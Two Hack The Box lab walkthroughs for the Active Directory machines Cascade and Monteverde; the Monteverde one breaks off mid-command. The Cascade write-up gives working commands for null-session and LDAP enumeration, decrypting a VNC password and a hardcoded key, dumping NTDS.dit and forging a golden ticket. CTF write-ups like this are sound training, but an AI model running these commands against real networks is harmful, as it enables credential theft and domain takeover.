        "content": "Cascade Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Cascade How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Cascade/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 17:50:51 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 17:50 BST Nmap scan report for 10.129.136.213 Host is up (0.040s latency). Not shown: 986 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown Initial thoughts: DNS, Kerberos, SMB \u0026amp; LDAP all great for enumerating. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Cascade/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh took 10s 🕙 17:51:04 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 17:51 BST Nmap scan report for 10.129.136.213 Host is up (0.039s latency). Not shown: 65520 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-14 16:55:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 2008|7|Phone|Vista|8.1 (89%) OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Vista SP2 (89%), Microsoft Windows Embedded Standard 7 (88%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2024-10-14T16:56:32 |_ start_date: 2024-10-14T16:47:45 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 324.37 seconds Findings: DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note, just standard DNS entries. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc casc-dc1.cascade.local ~/Wordlists/statistically-likely-usernames/jsmith.txt I get no hits. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Neither work. RPC 111: As RPC is running on the host we can attempt to enumerate using it.\n49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Connecting to RPC using a null session with rpcclient:\nrpcclient -U \u0026quot;%\u0026quot; $box Awesome we can get a null session. +Note+: I actually wrote a cheat-sheet blog off of the back of this enumeration which goes into a deep dive regarding RPC:\nhttps://bloodstiller.com/cheatsheets/rpc-cheatsheet/ Enumerating users with rpcclient: Enumerating users:\nenumdomusers There are some interesting things straight away here. The CascGuest \u0026amp; BackupSvc accounts. It looks like they have replaced their standard Guest account with CascGuest I attempt to connect as CascGuest using netexec:\nIt fails. I attempt to add myself as a user to the domain but am denied:\ncreatedomuser bloodstiller Now that we have the user \u0026amp; group RIDs we can enumerate further.\nDiscovering User Login Scripts with rpcclient: Using rpcclient we can enumerate specific by passing their RID to the command queryuser\nqueryuser 0x453 Steve Smith has the MapAuditDrive.vbs:\nMultiple Users have the MapDataDrive.vbs logon script:\nJames Wakefield Stephanie Hickson John Goodhand Edward Crowe David Burman Joseph Allen Ian Croft Enumerating Groups with rpcclient: Enumerating groups with rpcclient:\nenumdomgroups I enumerate all of these groups however there is no additional information in their description fields:\nquerygroup RID I enumerate builtin groups too however it says they do not exist when trying to delve further:\nenumalsgroups builtin I do the same again with the domain groups but have the same issue:\nenumalsgroups domain Why so many different rpcclient group enumeration commands? Just in-case you are wondering, why has he listed all of these different ways to list groups \u0026amp; gotten different results each time? enumdomgroups: Lists domain-wide groups that are used across the Active Directory domain. enumalsgroups domain: Lists local alias groups that are specific to the domain controller or server itself. Enumerating the password policy with rpcclient: I get the domains password policy: getdompwinfo But what does this mean? Understanding password_properties: password_properties is a bitmask, where different bits control specific password policies.\nHere are the common flags and what each bit represents:\nHex Value: 0x00000001\nFlag: DOMAIN_PASSWORD_COMPLEX\nMeaning: Enforces password complexity (requires uppercase, lowercase, digits, symbols)\nHex Value: 0x00000002\nFlag: DOMAIN_PASSWORD_NO_ANON_CHANGE\nMeaning: Prevents anonymous users from changing passwords\nHex Value: 0x00000004\nFlag: DOMAIN_PASSWORD_NO_CLEAR_CHANGE\nMeaning: Prevents passwords from being sent in cleartext\nHex Value: 0x00000008\nFlag: DOMAIN_LOCKOUT_ADMINS\nMeaning: Locks out administrators as well when lockout occurs\nHex Value: 0x00000010\nFlag: DOMAIN_PASSWORD_STORE_CLEARTEXT\nMeaning: Allows storing passwords using reversible encryption (cleartext)\nHex Value: 0x00000020\nFlag: DOMAIN_REFUSE_PASSWORD_CHANGE\nMeaning: Prevents users from changing their password\nHex Value: 0x00000000\nMeaning: Means that none of these password restrictions are enabled.\nIn this case, no complexity rules, no restrictions on anonymous password changes, and no other special password policies are applied.\nLDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker python3 ldapchecker.py $box It turns out the anonymous bind is enabled however we can still get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:05:48 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.136.213 with SSL... Failed to connect with SSL. Retrying without SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=cascade,DC=local CN=Configuration,DC=cascade,DC=local CN=Schema,CN=Configuration,DC=cascade,DC=local DC=DomainDnsZones,DC=cascade,DC=local DC=ForestDnsZones,DC=cascade,DC=local We have the domain functionaility level:\ndomainFunctionality: 4 forestFunctionality: 4 domainControllerFunctionality: 4 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 4 which means that this server has to be running Windows Server 2008 R2 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nserverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. LDAP User \u0026amp; Group Enumeration Using Anonymous Bind: As anonymous bind is enabled we can enumerate all the users on the domain also:\nldapsearch -H ldap://casc-dc1.$domain:389 -x -b \u0026quot;DC=cascade,DC=local\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=user))\u0026quot; | grep sAMAccountName: | cut -f2 -d\u0026quot; \u0026quot; \u0026gt;\u0026gt; ldapUsers.txt My first command just extacted SAM names, which we already have from RPC, so lets extract all the users information:\nldapsearch -H ldap://casc-dc1.$domain:389 -x -b \u0026quot;DC=cascade,DC=local\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=user))\u0026quot; \u0026gt;\u0026gt; ldapUsersAll.txt As anonymous bind is enabled we can enumerate all the groups on the domain also: ldapsearch -H ldap://casc-dc1.$domain:389 -x -b \u0026quot;DC=cascade,DC=local\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=Group))\u0026quot; | grep sAMAccountName: | cut -f2 -d\u0026quot; \u0026quot; \u0026gt;\u0026gt; ldapGroups.txt 2. Foothold: Finding a password in the cascadeLegacyPwd field: Looking through the extracted user data from ldap I see there is a field called cascadeLegacyPwd in the users r.thompson\u0026rsquo;s entry.\nI test the password with netexec but it doesn\u0026rsquo;t work:\nnetexec smb $box -u $user -p $pass --shares +It dawns on me, it\u0026rsquo;s base64 encoded!!!+\nI decode the password: echo $pass | base64 -d +Note+: Ironically it would have been a better password in it\u0026rsquo;s bas64 encoded form as it has: Uppercase Lowercase Numbers Symbols Is longer. Enumerating the domain as r.thompson: I check ryan\u0026rsquo;s creds with netexec and get access: netexec smb $box -u $user -p $pass --shares Pillaging the IT SMB Share: I connect using smbclient:\nsmbclient -U $domain\\\\$user \\\\\\\\$box\\\\Data I find shares and see if I can access them all however I am only able to access the IT share currently:\nI find a file called Meeting_Notes_June_2018.html in the Email Archives directory I download it:\nget Meeting_Notes_June_2018.html I find a file called ArkAdRecycleBin.log in the Logs\\Ark AD Recycle Bin\\ folder:\nget ArkAdRecycleBin.log I find a file called dcdiag.log in the Logs\\DCs\\ folder:\nget dcdiag.log I find a file called VNC Install.reg *in the* \\IT\\Temp\\s.smith\\ folder:\nget \u0026quot;VNC Install.reg\u0026quot; Pillaging the NETLOGON share: I access the NETLOGON share: smbclient -U $domain\\\\$user \\\\\\\\$box\\\\NETLOGON I find two scripts: MapAuditDrive.vbs \u0026amp; MapDataDrive.vbs I download them both: - Finding that there is a TempAdmin account with the same password as normal admin: In the Meeting_Notes_June_2018.html file it says there is a TempAdmin account that should have the same password as the normal Admin\nHowever looking at ArkAdRecycleBin.log it looks like this account has already been deleted:\nWe will file this away incase it is useful later. Finding a TightVNC password in VNC Install.reg Looking at the VNC Install.reg file I can see it\u0026rsquo;s the registyr entry for a TightVNC install:\nThere is a hard-coded hex password in the file:\nSome quick DuckDuckGoing (doesn\u0026rsquo;t sound as cool as \u0026ldquo;Googling\u0026rdquo;) \u0026amp; I find a decryption method:\nAccording to this entry VNC uses a hard-coded DES key to store credentials. And the same key is used across multiple different products. I use the command at the bottom of the page \u0026amp; get the clear-text password:\necho -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv I test if it\u0026rsquo;s s.smiths \u0026amp; it is:\nnetexec smb $box -u $user -p $pass Running a bloodhound collection: It\u0026rsquo;s about time we ran a bloodhound collection after grabbing all the low-hanging fruit: python3 bloodhound.py -dc casc-dc1.$domain -c All -u $user -p $pass -d $domain -ns $box Enumerating as s.smith: Looking at the bloodhound data we can see that s.smith is part of numerous groups:\nWe can see he is part of the \u0026ldquo;Remote Management Users\u0026rdquo; so we should be able to get access to the machine now. I access the host via evil-winrm:\nevil-winrm -i $box -u $user -p $pass Get our user flag:\nEnumerating \u0026amp; pillaging the audit$ share: We can see that they also have access to the audit$ share:\nI connect using smbclient:\nsmbclient -U $domain\\\\$user \\\\\\\\$box\\\\Audit$ There are alot of interesting things here. To make life easier I create a .tar file of all the files:\ntar c all.tar +Note+: This will make a .tar of all the files excluding directories and download it automatically. I download the remaining files in the directories:\nx86\\SQLite.Interop.dll x64\\SQLite.Interop.dll DB\\Audit.db 3. Privilege Escalation: Examining DB\\Audit.db: I open DB\\Audit.db in sqlitebrowser:\nThe ldap table appears to have the credentials for the ArkSvc service. I try \u0026amp; base64 decode it however it appears to be a malformed string: It could be encrypted and we don\u0026rsquo;t have the encryption key. The rest of the tables related to deleted accounts:\nLooking at RunAudit.bat we can see it is just used to run CascAudit.exe \u0026amp; pass the Audit.db to it:\nI want to decompile the .exe and dll so will fire up my command windows vm:\nIf you\u0026rsquo;re unfamiliar with the command project, it\u0026rsquo;s great: https://github.com/mandiant/commando-vm It\u0026rsquo;s an offensive VM with loads of great tools. Finding a hardcoded decryption key in the CascAudit.exe binary using DNSpy: Opening the CascAudit.exe in DNSpy I immediately find a hard-coded decryption key win the MainModule. Let\u0026rsquo;s break this code down: Below is the code that we are most interested in. Lets break it down. { using (SQLiteConnection sQLiteConnection = new SQLiteConnection(\u0026#34;Data Source=\u0026#34; + MyProject.Application.CommandLineArgs[0] + \u0026#34;;Version=3;\u0026#34;)) { string text = string.Empty; string password = string.Empty; string text2 = string.Empty; try { sQLiteConnection.Open(); using (SQLiteCommand sQLiteCommand = new SQLiteCommand(\u0026#34;SELECT * FROM LDAP\u0026#34;, sQLiteConnection)) { using (SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader()) { sQLiteDataReader.Read(); text = Conversions.ToString(sQLiteDataReader[\u0026#34;Uname\u0026#34;]); text2 = Conversions.ToString(sQLiteDataReader[\u0026#34;Domain\u0026#34;]); string encryptedString = Conversions.ToString(sQLiteDataReader[\u0026#34;Pwd\u0026#34;]); try { password = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); } catch (Exception ex2) { Console.WriteLine(\u0026#34;Error decrypting password: \u0026#34; + ex2.Message); return; } } } sQLiteConnection.Close(); } Database Connection and Initialization using (SQLiteConnection sQLiteConnection = new SQLiteConnection(\u0026#34;Data Source=\u0026#34; [PlusSymbol] MyProject.Application.CommandLineArgs[0] [PlusSymbol] \u0026#34;;Version=3;\u0026#34;)) Creates a new SQLite connection using the database file path from the first command-line argument. string text = string.Empty; string password = string.Empty; string text2 = string.Empty; Initializes empty strings to store the username (text), password, and domain (text2). sQLiteConnection.Open(); Opens the SQLite database connection. Querying the Database\nusing (SQLiteCommand sQLiteCommand = new SQLiteCommand(\u0026quot;SELECT * FROM LDAP\u0026quot;, sQLiteConnection)) Creates an SQL command to select all data from the LDAP table. using (SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader()) Executes the SQL command and creates a reader for the results. sQLiteDataReader.Read(); Reads the first row of the query results. Retrieving LDAP Credentials:\ntext = Conversions.ToString(sQLiteDataReader[\u0026quot;Uname\u0026quot;]); text2 = Conversions.ToString(sQLiteDataReader[\u0026quot;Domain\u0026quot;]); string encryptedString = Conversions.ToString(sQLiteDataReader[\u0026quot;Pwd\u0026quot;]); Retrieves the username, domain, and encrypted password from the query results. Stores these values in the respective variables. Password Decryption:\npassword = Crypto.DecryptString(encryptedString, \u0026quot;c4scadek3y654321\u0026quot;); Attempts to decrypt the password using a custom Crypto.DecryptString method. This is actually calling the CascCrypto.dll that was also available in the audit share. +Security Note+: The decryption key \u0026quot;c4scadek3y654321\u0026quot; is hardcoded, which is a significant security risk, as anyone who decompiles the binary can find this key. Cleanup:\nsQLiteConnection.Close(); Closes the SQLite database connection. So what does it do?\nThis code retrieves LDAP credentials from an SQLite database and decrypts the password. Remember we found Audit.db earlier which is an SQLite db which had an entry for the ArkSvc account\u0026gt; Extracting the ArkSvc password from CascAudit.exe: +Requirements+: For this to work, we will need the Audit.db \u0026amp; CascCrypto.dll, the .dll has to be in the same folder as the .exe\nSet a breakpoint in DNSpy.\nSelect the line with the encryption key \u0026amp; right-click \u0026amp; select \u0026ldquo;Add Breakpoint\u0026rdquo; Click \u0026ldquo;Start\u0026rdquo;:\nFrom the \u0026ldquo;Arguments\u0026rdquo; section ensure you select the location of the Audit.db\nClick \u0026ldquo;OK\u0026rdquo; +Note+: If you remember in RunAudit.Bat we can see that the argument the .exe takes is the location of the .db The debugger will break on the line we selected, however to get the result we need to step over it:\nOnce we have stepped over the clear text password will be visible:\n+Note+: It has trailing \\0\\0\\0, these can be deleted. I verify the credentials work using netexec:\n5. Ownership: Enumerating as arksvc: Checking bloodhound I can see that arksvc has access to the AD Recyle Bin:\nIf you remember we saw that temp-admin was in the recycle bin when we were looking at the recovered Audit.db file: After some quick searching I find this article which details how to recover deleted objects in the AD Recycle Bin. It says:\nBy default, if an object has been deleted, it can be recovered within a 180 days interval. This value is specified in the msDS-DeletedObjectLifetime attribute\nFinding the Administrator Password in the cascadeLegacyPwd field of a deleted object: I list the objects in the recycling bin:\nGet-ADObject -filter 'isdeleted -eq $true -and name -ne \u0026quot;Deleted Objects\u0026quot;' -includeDeletedObjects -property * I immediately find the deleted temp-admin account:\nLooking at the entry we can see that is has the same cascadeLegacyPwd field that we found before that contained a base64 encoded password\nIf you remember when we looked at Meeting_Notes_June_2018.html it said that the temp-admin and normal admin have the same password: I decode the password:\nBoom we have root:\nLets get our root flag:\n4. Persistence: Dumping NTDS.dit: Lets dump the NTDS.dit database using netexec: netexec smb $box -u $user -p $pass -M ntdsutil Creating a Golden Ticket: Using impacket-lookupsid to extract the domain SID:\nimpacket-lookupsid $domain/administrator@$box -domain-sids I use impacket-ticketer to create the ticket:\nIt kicks out a bunch of errors but creates the administrator.ccache I sync my clock with the target:\nsudo ntpdate -s casc-dc1.$domain I load the ticket into the KRB5CCNAME Variable:\nexport KRB5CCNAME=./administrator.ccache I connect using impacket-psexec:\nimpacket-psexec casc-dc1.$domain -k Lessons Learned: What did I learn? I actually had a lot fun using RPC to enumerate, purely as a test, to see how much I could get from the box before I had to switch to other means. It was fun. It was also nice to have a box where the approach wasn\u0026rsquo;t web based or something in an open share etc, it was fun to use LDAP (which I enjoy) extensively. I never knew about recovering items from the AD Recycling Bin. I learned more about C# decompiling etc, however I am going to do more work on this so I have a better understanding. This is one of my weaker points. What silly mistakes did I make? Oh, one day I couldn\u0026rsquo;t sleep so woke up at 4:30am and wondered why it wouldn\u0026rsquo;t connect for ages until I realized I hadn\u0026rsquo;t updated /etc/hosts that was fun. Again, I spent alot of time on the C# decompiling etc as it\u0026rsquo;s one of my weaker areas. Oh not realizing the first found password was base64 encoded for a few mins was fun…. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "content": "Monteverde Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Monteverde How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $pass = Passwords I have access to. Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:24:32 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 11:24 BST Nmap scan report for 10.129.228.111 Host is up (0.040s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds Initial thoughts: DNS, Kerberos, LDAP \u0026amp; SMB give us great starting points for enumeration. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh took 12s 🕙 11:24:49 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 11:25 BST Nmap scan report for 10.129.228.111 Host is up (0.071s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-13 10:28:37Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49676/tcp open msrpc Microsoft Windows RPC 49696/tcp open msrpc Microsoft Windows RPC 49796/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (88%) Aggressive OS guesses: Microsoft Windows Server 2019 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-13T10:29:42 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 304.90 seconds Findings: SMB Signing is enabled so no relay attacks. We seem to be dealing with server 2019. LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker python3 ldapchecker.py $box It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:25:54 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.228.111 with SSL... Failed to connect with SSL. Retrying without SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=MEGABANK,DC=LOCAL CN=Configuration,DC=MEGABANK,DC=LOCAL CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=MEGABANK,DC=LOCAL ldapServiceName: MEGABANK.LOCAL:monteverde$@MEGABANK.LOCAL The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) So it appears it\u0026rsquo;s a printer server site of some sort. What is also interesting is the CN name \u0026ldquo;Configuration\u0026rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned. serverName: CN=MONTEVERDE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGABANK,DC=LOCAL It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. LDAP User Enumeration: As anonymous bind is enabled we can enumerate all the users on the domain also:\nldapsearch -H ldap://monteverde.MEGABANK.LOCAL -x -b \u0026quot;DC=MEGABANK,DC=LOCAL\u0026quot; -s sub \u0026quot;(\u0026amp;(objectclass=user))\u0026quot; | grep sAMAccountName: | cut -f2 -d\u0026quot; \u0026quot; \u0026gt;\u0026gt; ldapUsers.txt Discoveries:\nLooking at the file we can see it\u0026rsquo;s a small list of users, but most noticeably there are also a series of services running which is interesting. However we can confirm this is an Azure Active Directory environment as there is a user called: AAD_987d7f2f57d2 Azure AD often uses unique object identifiers like AAD_987d7f2f57d2 to represent accounts or resources internally. I add all the users to my users list. LDAP Group Enumeration: We can also enumerate the groups on the domain:\nldapsearch -H 